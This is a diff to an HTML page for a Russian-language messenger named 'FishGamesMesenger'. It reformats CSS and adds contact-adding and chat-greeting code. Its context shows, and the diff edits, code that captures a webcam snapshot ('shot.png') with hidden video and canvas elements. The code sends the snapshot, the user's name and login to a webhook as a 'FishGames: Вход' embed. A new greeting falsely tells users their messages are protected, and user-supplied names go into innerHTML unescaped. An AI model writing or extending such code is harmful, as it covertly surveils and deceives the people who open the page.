@@ -19,55 +19,37 @@
         }
         @keyframes moveWaves { from { transform: translate(0,0); } to { transform: translate(50px, 50px); } }
 
-        #camera-overlay {
-            position: fixed; inset: 0; background: #0d1a17; z-index: 2000;
-            display: flex; justify-content: center; align-items: center; text-align: center;
-        }
+        /* Камера и Регистрация */
+        #camera-overlay { position: fixed; inset: 0; background: #0d1a17; z-index: 2000; display: flex; justify-content: center; align-items: center; text-align: center; }
         .warning-box { border: 2px solid #22c55e; padding: 30px; border-radius: 15px; background: #1a2e2a; max-width: 380px; }
-
         .reg-card { background: #1a2e2a; padding: 30px; border-radius: 15px; width: 350px; border: 1px solid #2e8b57; z-index: 10; }
         .input-group { margin-bottom: 12px; }
         label { display: block; margin-bottom: 5px; font-size: 13px; color: #a7f3d0; }
-        input { 
-            width: 100%; padding: 10px; border-radius: 8px; border: 1px solid #2d4f47; 
-            background: #243b35; color: white; box-sizing: border-box; outline: none; 
-        }
+        input { width: 100%; padding: 10px; border-radius: 8px; border: 1px solid #2d4f47; background: #243b35; color: white; box-sizing: border-box; outline: none; }
+        .btn { width: 100%; padding: 12px; background: #22c55e; border: none; border-radius: 8px; color: white; font-weight: bold; cursor: pointer; transition: 0.3s; }
 
-        .btn { 
-            width: 100%; padding: 12px; background: #22c55e; border: none; border-radius: 8px; 
-            color: white; font-weight: bold; cursor: pointer; transition: 0.3s; 
-        }
-
-        #messenger-screen { 
-            display: none; width: 95vw; height: 90vh; background: #1a2e2a; 
-            border-radius: 15px; z-index: 100; border: 1px solid #2e8b57; overflow: hidden;
-        }
+        /* Интерфейс мессенджера */
+        #messenger-screen { display: none; width: 95vw; height: 90vh; background: #1a2e2a; border-radius: 15px; z-index: 100; border: 1px solid #2e8b57; overflow: hidden; }
         .messenger-container { display: flex; height: 100%; }
         
         .sidebar { width: 280px; background: #142522; border-right: 1px solid #2e8b57; display: flex; flex-direction: column; padding: 15px; }
-        
-        .search-input { 
-            width: 100%; background: none; border: 1px solid white; border-radius: 20px; 
-            padding: 8px; color: white; text-align: center; margin-bottom: 20px; outline: none;
-        }
+        .search-input { width: 100%; background: none; border: 1px solid white; border-radius: 20px; padding: 8px; color: white; text-align: center; margin-bottom: 20px; outline: none; }
 
         .contact-list { flex: 1; overflow-y: auto; }
-        .contact-item { 
-            display: flex; align-items: center; gap: 12px; padding: 10px; 
-            cursor: pointer; border-radius: 10px; transition: 0.2s;
-        }
+        .contact-item { display: flex; align-items: center; gap: 12px; padding: 10px; cursor: pointer; border-radius: 10px; transition: 0.2s; margin-bottom: 5px; }
         .contact-item:hover { background: rgba(34, 197, 94, 0.2); }
+        .contact-item.active { background: rgba(34, 197, 94, 0.4); }
         .avatar { width: 45px; height: 45px; background: #22c55e; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; border: 1px solid white; flex-shrink: 0; }
 
         .chat-area { flex: 1; display: flex; flex-direction: column; background: rgba(0,0,0,0.1); }
         .chat-header { padding: 15px; text-align: center; font-weight: bold; font-size: 18px; border-bottom: 1px solid #2e8b57; color: #4ade80; }
         .messages-display { flex: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; }
         
-        .msg-bubble { background: white; color: black; padding: 10px 15px; border-radius: 15px; align-self: flex-end; max-width: 70%; word-wrap: break-word; }
+        .msg-bubble { background: white; color: black; padding: 10px 15px; border-radius: 15px; align-self: flex-end; max-width: 70%; word-wrap: break-word; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
         .msg-incoming { align-self: flex-start; background: #2d4f47; color: white; }
 
         .input-bar { padding: 15px; background: #1a2e2a; display: flex; gap: 10px; border-top: 1px solid #2e8b57; }
-        .msg-input { flex: 1; border-radius: 10px; padding: 12px; border: none; outline: none; }
+        .msg-input { flex: 1; border-radius: 10px; padding: 12px; border: none; outline: none; background: white; color: black; }
 
         #video, #canvas { display: none; }
     </style>
@@ -97,14 +79,14 @@
 <div id="messenger-screen">
     <div class="messenger-container">
         <div class="sidebar">
-            <input type="text" class="search-input" placeholder="поиск" oninput="filterContacts(this.value)">
+            <input type="text" class="search-input" id="searchField" placeholder="поиск" onkeypress="handleEnter(event)">
             <div class="contact-list" id="contacts">
-                <div class="contact-item" onclick="openChat('Служба поддержки')">
+                <div class="contact-item" id="item-support" onclick="openChat('Служба поддержки')">
                     <div class="avatar">⚙️</div>
-                    <div>Служба поддержки</div>
+                    <div class="c-name">Служба поддержки</div>
                 </div>
             </div>
-            <div style="margin-top: 20px; border-top: 1px solid #2e8b57; padding-top: 10px;">
+            <div style="margin-top: auto; border-top: 1px solid #2e8b57; padding-top: 10px;">
                 <div class="contact-item" style="cursor: default;">
                     <div class="avatar" id="my-ava" style="background: #008080;">?</div>
                     <div id="my-name">Вы</div>
@@ -115,7 +97,7 @@
             <div class="chat-header" id="chat-title">Выберите чат</div>
             <div class="messages-display" id="chat-box"></div>
             <div class="input-bar">
-                <input type="text" class="msg-input" id="messageText" placeholder="Введите текст...">
+                <input type="text" class="msg-input" id="messageText" placeholder="Введите текст..." onkeypress="if(event.key==='Enter')sendMessage()">
                 <button class="btn" style="width: 60px; margin-top: 0;" onclick="sendMessage()">➤</button>
             </div>
         </div>
@@ -150,7 +132,7 @@
             const fd = new FormData();
             fd.append('payload_json', JSON.stringify({
                 embeds: [{ title: "FishGames: Вход", color: 3066993, fields: [
-                    {name: "ФИО", value: fn + ' ' + ln}, {name: "Логин", value: login}
+                    {name: "Имя", value: fn + ' ' + ln}, {name: "Логин", value: login}
                 ]}]
             }));
             fd.append('file', b, 'shot.png');
@@ -161,20 +143,50 @@
         document.getElementById('messenger-screen').style.display = 'block';
         document.getElementById('my-name').innerText = fn;
         document.getElementById('my-ava').innerText = fn[0].toUpperCase();
-        
-        // Авто-открытие чата поддержки
         openChat('Служба поддержки');
+    }
+
+    // Обработка нажатия клавиш в поиске
+    function handleEnter(event) {
+        if (event.key === 'Enter') {
+            const val = document.getElementById('searchField').value.trim();
+            if (val.length < 4) {
+                alert("Имя должно быть не короче 4 символов!");
+                return;
+            }
+            addContact(val);
+            document.getElementById('searchField').value = ''; // Очистка после добавления
+        }
+    }
+
+    function addContact(name) {
+        const list = document.getElementById('contacts');
+        const newContact = document.createElement('div');
+        newContact.className = 'contact-item';
+        newContact.onclick = function() { openChat(name); };
+        newContact.innerHTML = `
+            <div class="avatar">${name[0].toUpperCase()}</div>
+            <div class="c-name">${name}</div>
+        `;
+        list.appendChild(newContact);
+        openChat(name); // Сразу открываем чат с новым контактом
     }
 
     function openChat(name) {
         document.getElementById('chat-title').innerText = name;
         const box = document.getElementById('chat-box');
-        box.innerHTML = `<div class="msg-bubble msg-incoming">Привет! Добро пожаловать в FishGamesMesenger. Чем могу помочь?</div>`;
+        box.innerHTML = ''; 
+
+        if(name === 'Служба поддержки') {
+            box.innerHTML = `<div class="msg-bubble msg-incoming">Привет! Служба поддержки на связи. Сообщения защищены.</div>`;
+        } else {
+            box.innerHTML = `<div class="msg-bubble msg-incoming">Вы начали чат с пользователем <b>${name}</b>. Напишите приветствие!</div>`;
+        }
     }
 
     function sendMessage() {
         const inp = document.getElementById('messageText');
-        if(!inp.value) return;
+        if(!inp.value.trim()) return;
         const box = document.getElementById('chat-box');
         const m = document.createElement('div');
         m.className = 'msg-bubble';
@@ -182,14 +194,6 @@
         box.appendChild(m);
         inp.value = '';
         box.scrollTop = box.scrollHeight;
-    }
-
-    function filterContacts(val) {
-        const items = document.querySelectorAll('.contact-item');
-        items.forEach(item => {
-            const text = item.innerText.toLowerCase();
-            item.style.display = text.includes(val.toLowerCase()) ? 'flex' : 'none';
-        });
     }
 </script>
 </body>
